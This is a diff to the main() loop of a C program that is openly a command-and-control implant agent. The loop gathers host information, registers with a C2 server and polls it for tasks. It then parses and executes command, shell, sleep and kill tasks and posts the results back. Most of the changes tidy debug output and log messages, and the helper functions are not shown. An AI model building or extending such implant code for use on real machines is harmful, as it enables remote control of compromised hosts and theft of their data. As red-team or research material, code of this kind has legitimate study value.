@@ -18,12 +18,9 @@ int main(void)
         if(get_host_info(&agent)) {
             puts("Host info gathered.\n");
             host_info_gathered = true;
-            // printf("Hostname in main: %s\n", agent.hostname);
-            // printf("Agent os_type in main: %s\n", agent.os_version);
-            // printf("Agent os_version in main: %s\n", agent.os_version);
             break;
         } else {
-            puts("Unable to gather host info\n");
+            puts("Unable to gather host info.\n");
             continue;
         }
     }
@@ -32,9 +29,8 @@ int main(void)
     bool registered = false;
     while(!registered) {
         if(reg(&agent, &sa)) {
-            puts("Registered\n");
+            puts("Agent has registered with C2 server.\n");
             registered = true;
-	        printf("The data returning from agent registration main is %s\n\n", sa.response);
             continue;
         } else {
             puts("Failed to register agent with C2 server, trying again.\n");
@@ -43,13 +39,12 @@ int main(void)
         }
 
     }
-    puts("Made it out of reg\n");
-    printf("UUID in main is %s", agent.uuid);
 
     create_tasks_url(sa.response, &agent);
     create_results_url(&agent, &task);
 
     puts("Checking in for tasks\n");
+
     while(true) {
         if(!check_tasks(&agent, &sa)) {
             puts("No tasks during check in.\n");
@@ -65,19 +60,12 @@ int main(void)
         // Begin iterating through task.tasks_array array and extracting task ID
         // task type, task cmd, and args to then call follow on task execution
         // functions.
+        printf("%ld tasks collected.\n\n", task.sz);
         for (unsigned int i = 0; i < task.sz; i++) {      
 
             // Ref for scanning remainder of string (%[\001-\377]):
             // https://stackoverflow.com/questions/35101996/sscanf-get-the-value-of-the-remaining-string
             sscanf(task.tasks_array[i], "%s %d %s %[\001-\377]", task.id, &task.type, task.cmd, task.args);
-            printf("Tasks ID: %s\n", task.id);
-            printf("Tasks Type: %d\n", task.type);
-            printf("Tasks Cmd: %s\n", task.cmd);
-            printf("Tasks Arg: %s\n", task.args);
-            puts(" \n");
-            // Eventually check_tasks will return the task type and
-            // specific task. An if block or switch case will be added
-            // here to call appropriate functions for a given task type.
 
             // Designates enum for task types.
             enum TASK_TYPE {CMD, SLEEP, SHELL, KILL};
@@ -86,7 +74,7 @@ int main(void)
             // task execution functions.
             switch (task.type) {
             case CMD:
-                puts("CMD task detected\n");
+                printf("Executing task: %s %s\n\n", task.cmd, task.args);
                 exec_cmd(&task);
                 break;
             case SLEEP:
@@ -102,14 +90,12 @@ int main(void)
                 puts("Invalid task type.\n");
                 continue;
             }
-
             post_results(&task, &sa);
+            printf("Posted results for task: %s\n\n", task.cmd);
 
             // After executing each task and posting results reset values
-            // to execute  next task.
+            // to execute next task.
             reset_task_vals(&task);
-
-
         }
 
         free(sa.response);
